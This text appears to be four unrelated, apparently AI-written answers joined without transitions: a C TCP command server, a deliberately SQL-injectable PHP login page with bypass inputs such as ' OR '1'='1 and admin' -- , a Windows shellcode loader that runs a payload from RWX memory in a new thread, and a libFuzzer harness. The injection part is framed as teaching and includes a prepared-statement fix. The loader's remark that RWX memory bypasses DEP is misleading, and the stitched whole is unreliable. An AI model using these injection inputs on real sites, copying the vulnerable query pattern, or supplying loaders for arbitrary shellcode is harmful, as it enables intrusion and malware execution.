Below is a minimal TCP command server in C. It listens on port 8080, accepts exactly one client connection, and processes simple text commands line by line until the client sends "QUIT" or disconnects.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 8080
#define BUFFER_SIZE 1024

// Function to handle a single client connection
void handle_client(int client_fd) {
    char buffer[BUFFER_SIZE];
    int bytes_read;
    char *line;
    size_t line_len = 0;
    char response[BUFFER_SIZE];

    printf("Client connected. Waiting for commands...\n");

    // Loop reading lines from the client
    while (1) {
        // Read data from client
        bytes_read = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_read <= 0) {
            if (bytes_read == 0)
                printf("Client disconnected.\n");
            else
                perror("recv");
            break;
        }
        buffer[bytes_read] = '\0';

        // Process each line in the received data
        char *start = buffer;
        char *newline;
        while ((newline = strchr(start, '\n')) != NULL) {
            *newline = '\0';  // Replace newline with null terminator
            line = start;
            // Remove trailing carriage return if present
            size_t len = strlen(line);
            if (len > 0 && line[len-1] == '\r')
                line[len-1] = '\0';

            printf("Received command: %s\n", line);

            // Process command
            if (strcmp(line, "HELLO") == 0) {
                strcpy(response, "Hello, client!\n");
            } else if (strcmp(line, "TIME") == 0) {
                time_t now = time(NULL);
                struct tm *tm_info = localtime(&now);
                strftime(response, sizeof(response), "%Y-%m-%d %H:%M:%S\n", tm_info);
            } else if (strcmp(line, "QUIT") == 0) {
                strcpy(response, "Goodbye!\n");
                send(client_fd, response, strlen(response), 0);
                printf("Client requested quit. Closing connection.\n");
                close(client_fd);
                return;
            } else {
                strcpy(response, "Unknown command. Try HELLO, TIME, or QUIT.\n");
            }

            // Send response
            send(client_fd, response, strlen(response), 0);

            // Move to next line
            start = newline + 1;
        }

        // If there is leftover data without newline, keep it for next read
        // For simplicity, we ignore partial lines (not robust, but minimal)
    }

    close(client_fd);
}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Set socket options to reuse address
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind socket to port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Listen for connections
    if (listen(server_fd, 1) < 0) {
        perror("listen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", PORT);

    // Accept one client connection
    if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
        perror("accept");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Accepted connection from %s:%d\n",
           inet_ntoa(address.sin_addr), ntohs(address.sin_port));

    // Handle the client
    handle_client(client_fd);

    // Close server socket
    close(server_fd);
    printf("Server shutting down.\n");
    return 0;
}
```

### How to compile and run

1. Save the code to a file, e.g., `tcp_server.c`.
2. Compile with:  
   `gcc -o tcp_server tcp_server.c`
3. Run:  
   `./tcp_server`
4. Connect using a tool like `telnet` or `nc`:  
   `telnet localhost 8080`  
   or  
   `nc localhost 8080`

### Supported commands

- `HELLO` → responds with `Hello, client!`
- `TIME` → responds with the current date and time
- `QUIT` → responds with `Goodbye!` and closes the connection
- Any other input → responds with an unknown command message

The server handles one client and exits after that client disconnects or sends `QUIT`.

Below is an example of a **deliberately vulnerable** PHP login page. It is intended **only for educational purposes** to demonstrate how SQL injection works. **Do not use this code in a production environment.**

The script connects to a MySQL database, takes user input from a login form, and directly concatenates that input into a SQL query. This allows an attacker to manipulate the query and bypass authentication.

---

## Sample Database Setup

Assume you have a MySQL database named `testdb` with a table `users`:

```sql
CREATE DATABASE testdb;
USE testdb;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);

INSERT INTO users (username, password) VALUES
('admin', 'admin123'),
('john', 'johnpass'),
('alice', 'alicepass');
```

---

## Vulnerable PHP Login Page (`login.php`)

```php
<?php
// Database configuration
$host = 'localhost';
$db   = 'testdb';
$user = 'root';      // Change to your DB username
$pass = '';          // Change to your DB password

// Create connection
$conn = new mysqli($host, $user, $pass, $db);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Initialize variables
$error = '';

// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // VULNERABLE QUERY: Direct concatenation of user input
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $conn->query($sql);

    if ($result && $result->num_rows > 0) {
        // Login successful
        $row = $result->fetch_assoc();
        echo "<h2>Login successful! Welcome, " . htmlspecialchars($row['username']) . ".</h2>";
        exit;
    } else {
        $error = "Invalid username or password.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Login</title>
</head>
<body>
    <h2>Login Page (Vulnerable to SQL Injection)</h2>
    <?php if ($error): ?>
        <p style="color:red;"><?php echo $error; ?></p>
    <?php endif; ?>
    <form method="post" action="">
        <label>Username:</label>
        <input type="text" name="username" required><br><br>
        <label>Password:</label>
        <input type="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

---

## How to Test the SQL Injection

1. **Normal login** (valid credentials):  
   - Username: `admin`  
   - Password: `admin123`  
   → Login succeeds.

2. **SQL Injection bypass** (no valid credentials needed):  
   - Username: `' OR '1'='1`  
   - Password: `' OR '1'='1`  
   The resulting query becomes:
   ```sql
   SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
   ```
   Because `'1'='1'` is always true, the condition is satisfied for all rows, and the first user (usually `admin`) is returned. The attacker is logged in without knowing any real credentials.

3. **Another common injection**:  
   - Username: `admin' -- ` (note the space after `--`)  
   - Password: anything (e.g., `x`)  
   The query becomes:
   ```sql
   SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'x'
   ```
   The `--` comments out the rest of the SQL, so only the username condition is checked. If `admin` exists, login succeeds.

---

## Why This Is Dangerous

- The application trusts user input and places it directly into a SQL statement.
- An attacker can alter the query’s logic, extract data, modify or delete records, or even execute system commands (depending on database privileges).
- This is one of the most critical web application vulnerabilities (OWASP Top 10 – A03:2021 – Injection).

---

## How to Fix (Briefly)

- Use **prepared statements** with parameterized queries (e.g., `mysqli_prepare` or PDO).
- Never concatenate user input into SQL.
- Validate and sanitize input, but prepared statements are the primary defense.

Example of a safe query using prepared statements:

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

---

**Remember:** This code is intentionally insecure. Use it only in a controlled, isolated environment for learning about SQL injection.

Below is a basic Windows shellcode loader written in C. It allocates executable memory, copies a shellcode payload into it, and executes it in a new thread.

**Important:** This code is for educational purposes only. Only use it on systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.

```c
#include <windows.h>
#include <stdio.h>

// Example shellcode (replace with your own)
// This is a simple payload that just returns (0xC3 = ret)
unsigned char payload[] = {
    0xC3
};
unsigned int payload_len = sizeof(payload);

int main() {
    // Allocate memory with PAGE_EXECUTE_READWRITE permissions
    LPVOID exec_mem = VirtualAlloc(
        NULL,                       // Let system choose address
        payload_len,                // Size of allocation
        MEM_COMMIT | MEM_RESERVE,   // Allocate and commit memory
        PAGE_EXECUTE_READWRITE      // Allow execution, reading, and writing
    );

    if (exec_mem == NULL) {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    // Copy shellcode into the allocated memory
    memcpy(exec_mem, payload, payload_len);

    // Optional: Flush instruction cache to ensure CPU sees the new code
    FlushInstructionCache(GetCurrentProcess(), exec_mem, payload_len);

    // Create a new thread to run the shellcode
    HANDLE hThread = CreateThread(
        NULL,                       // Default security attributes
        0,                          // Default stack size
        (LPTHREAD_START_ROUTINE)exec_mem, // Start address = shellcode
        NULL,                       // No argument
        0,                          // Run immediately
        NULL                        // Don't need thread ID
    );

    if (hThread == NULL) {
        printf("CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
```

### How it works
1. **VirtualAlloc** reserves and commits a block of memory with `PAGE_EXECUTE_READWRITE` permissions, allowing the shellcode to be executed.
2. **memcpy** copies the shellcode bytes into that memory.
3. **FlushInstructionCache** (optional but recommended) ensures the CPU’s instruction cache is updated with the new code.
4. **CreateThread** starts a new thread whose entry point is the address of the allocated memory, effectively running the shellcode.
5. The main thread waits for the shellcode thread to finish, then frees the memory.

### Compilation
- **MSVC:** `cl loader.c`
- **MinGW:** `gcc loader.c -o loader.exe`

### Notes
- Replace the `payload` array with your actual shellcode. The example contains only a `ret` instruction (0xC3), which does nothing.
- Modern Windows systems have Data Execution Prevention (DEP) enabled; using `PAGE_EXECUTE_READWRITE` is necessary to bypass it for this simple loader.
- Antivirus software may flag this code as suspicious. Use in a controlled environment.

Below is a minimal libFuzzer harness for fuzzing a C image-parsing function. The harness assumes the parser has a signature like:

```c
int parse_image(const uint8_t *data, size_t size);
```

Replace this with the actual function you want to test.

```c
#include <stddef.h>
#include <stdint.h>

// Declare the image parsing function under test.
// Adjust the signature to match your actual parser.
int parse_image(const uint8_t *data, size_t size);

// The fuzzer entry point.
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Call the parser with the fuzzer-provided input.
    // The parser should not crash, hang, or leak memory on any input.
    parse_image(data, size);
    return 0;  // Non-zero return values are reserved for future use.
}
```

### Compilation

Compile with clang and libFuzzer:

```bash
clang -fsanitize=fuzzer,address -o fuzz_parser fuzz_parser.c your_image_parser.c
```

- `-fsanitize=fuzzer` enables libFuzzer.
- `-fsanitize=address` adds AddressSanitizer to catch memory errors (recommended).

Run the fuzzer:

```bash
./fuzz_parser
```

### Notes

- The harness is intentionally minimal; libFuzzer will generate random inputs and call `LLVMFuzzerTestOneInput` repeatedly.
- If your parser requires additional setup (e.g., initializing a context), do it once in a constructor or use a global initializer, but avoid per‑input heavy setup.
- For parsers that need a file‑like interface, you can wrap the data in a custom `FILE*` or memory stream inside the harness.
